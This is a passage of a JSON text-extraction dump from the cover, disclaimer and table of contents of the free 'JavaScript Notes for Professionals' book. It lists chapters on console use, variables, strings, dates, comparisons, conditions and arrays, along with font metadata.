[
    {
        "text": "JavaScript",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Notes for Professionals",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JavaScript \u00ae",
        "font_name": "Quicksand-Bold",
        "font_size": 90,
        "img": []
    },
    {
        "text": "Notes for Professionals",
        "font_name": "Quicksand-Bold",
        "font_size": 30,
        "img": []
    },
    {
        "text": "GoalKicker.com",
        "font_name": "Quicksand-Bold",
        "font_size": 24,
        "img": []
    },
    {
        "text": "Free Programming Books",
        "font_name": "Quicksand-Regular",
        "font_size": 16,
        "img": []
    },
    {
        "text": "Disclaimer",
        "font_name": "Quicksand-Bold",
        "font_size": 11,
        "img": []
    },
    {
        "text": "This is an uno\ue024cial free book created for educational purposes and is not a\ue024liated with o\ue024cial JavaScript \u00ae  group(s) or company(s). All trademarks and registered trademarks are the property of their respective owners",
        "font_name": "Quicksand-Regular",
        "font_size": 11,
        "img": []
    },
    {
        "text": "400+ pages",
        "font_name": "Quicksand-Bold",
        "font_size": 36,
        "img": []
    },
    {
        "text": "of professional hints and tricks",
        "font_name": "Quicksand-Regular",
        "font_size": 16,
        "img": [
            "output_directory\\image_1_1.png"
        ]
    },
    {
        "text": "Contents",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "About   1",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 1: Getting started with JavaScript   2",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.1: Using console.log()   2",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.2: Using the DOM API   4",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.3: Using window.alert()   5",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.4: Using window.prompt()   6",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.5: Using window.con\ufb01rm()   7",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or image \ufb01le)   8",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 2: JavaScript Variables   10",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 2.1: De\ufb01ning a Variable   10",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 2.2: Using a Variable   10",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 2.3: Types of Variables   10",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 2.4: Arrays and Objects   11",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 3: Built-in Constants   12",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.1: null   12",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.2: Testing for NaN using isNaN()   12",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.3: NaN   13",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.4: unde\ufb01ned and null   14",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.5: In\ufb01nity and -In\ufb01nity   15",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.6: Number constants   15",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.7: Operations that return NaN   16",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.8: Math library functions that return NaN   16",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 4: Comments   17",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 4.1: Using Comments   17",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 4.2: Using HTML comments in JavaScript (Bad practice)   17",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 5: Console   19",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.1: Measuring time - console.time()   22",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.2: Formatting console output   23",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.3: Printing to a browser's debugging console   24",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.4: Including a stack trace when logging - console.trace()   26",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.5: Tabulating values - console.table()   26",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.6: Counting - console.count()   28",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.7: Clearing the console - console.clear()   30",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.8: Displaying objects and XML interactively - console.dir(), console.dirxml()   30",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.9: Debugging with assertions - console.assert()   32",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 6: Datatypes in JavaScript   33",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 6.1: typeof   33",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 6.2: Finding an object's class   34",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 6.3: Getting object type by constructor name   34",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 7: Strings   37",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.1: Basic Info and String Concatenation   37",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.2: Reverse String   38",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.3: Comparing Strings Lexicographically   39",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.4: Access character at index in string   40",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.5: Escaping quotes   40",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.6: Word Counter  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... 41",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.7: Trim whitespace   41",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.8: Splitting a string into an array   41",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.9: Strings are unicode   42",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.10: Detecting a string   42",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.11: Substrings with slice   43",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.12: Character code   43",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.13: String Representations of Numbers   43",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.14: String Find and Replace Functions   44",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.15: Find the index of a substring inside a string   45",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.16: String to Upper Case   45",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.17: String to Lower Case   46",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.18: Repeat a String   46",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 8: Date   47",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.1: Create a new Date object   47",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.2: Convert to a string format   49",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.3: Creating a Date from UTC   50",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.4: Formatting a JavaScript date   53",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.5: Get the number of milliseconds elapsed since 1 January 1970 00:00:00 UTC   55",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.6: Get the current time and date   55",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.7: Increment a Date Object   56",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.8: Convert to JSON   57",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 9: Date Comparison   58",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 9.1: Comparing Date values   58",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 9.2: Date Di\ue023erence Calculation   59",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 10: Comparison Operations   60",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.1: Abstract equality / inequality and type conversion   60",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.2: NaN Property of the Global Object   61",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.3: Short-circuiting in boolean operators   63",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.4: Null and Unde\ufb01ned   65",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.5: Abstract Equality (==)   65",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.6: Logic Operators with Booleans   66",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.7: Automatic Type Conversions   67",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.8: Logic Operators with Non-boolean values (boolean coercion)   67",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.9: Empty Array   68",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.10: Equality comparison operations   68",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.11: Relational operators (<, <=, >, >=)   70",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.12: Inequality   71",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.13: List of Comparison Operators   72",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.14: Grouping multiple logic statements   72",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.15: Bit \ufb01elds to optimise comparison of multi state data   72",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 11: Conditions   74",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.1: Ternary operators   74",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.2: Switch statement   75",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.3: If / Else If / Else Control   77",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.4: Strategy   78",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.5: Using || and && short circuiting   79",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 12: Arrays   80",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.1: Converting Array-like Objects to Arrays   80",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.2: Reducing values   82",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.3: Mapping values  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... 84",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.4: Filtering Object Arrays   84",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.5: Sorting Arrays   86",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.6: Iteration   88",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.7: Destructuring an array   92",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.8: Removing duplicate elements   93",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.9: Array comparison   93",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.10: Reversing arrays   94",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.11: Shallow cloning an array   95",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.12: Concatenating Arrays   95",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.13: Merge two array as key value pair   97",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.14: Array spread / rest   97",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.15: Filtering values   98",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.16: Searching an Array   99",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.17: Convert a String to an Array   100",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.18: Removing items from an array   100",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.19: Removing all elements   101",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.20: Finding the minimum or maximum element   102",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.21: Standard array initialization   103",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.22: Joining array elements in a string   104",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.23: Removing/Adding elements using splice()   105",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.24: The entries() method   105",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.25: Remove value from array   105",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.26: Flattening Arrays   106",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.27: Append / Prepend items to Array   107",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.28: Object keys and values to array   107",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
